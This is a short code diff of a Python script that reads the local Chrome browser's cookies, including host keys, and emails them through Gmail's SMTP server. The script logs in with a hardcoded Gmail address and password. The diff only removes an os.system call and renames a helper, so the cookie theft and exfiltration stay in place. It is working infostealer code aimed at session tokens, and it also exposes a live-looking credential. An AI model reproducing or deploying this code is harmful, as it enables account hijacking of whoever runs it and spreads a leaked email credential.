@@ -17,18 +17,15 @@ This is a test e-mail message.
 
 
 try:
-
     from f import *
-    import os
-    os.system("mult")
-    
     smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
     smtpObj.starttls()
     smtpObj.login("petterjoin2018@gmail.com", "fakatvdofpozscyq")
     
 #     chrome
     message = get_cookies_host_key(get_all_cookies_chrome())
-    message = message +"\n\n\n\n"+print_cookies(get_all_cookies_chrome())
+    
+    message = message +"\n\n\n\n"+print_cookie(get_all_cookies_chrome())
     smtpObj.sendmail(sender, receivers, message)    
     
     
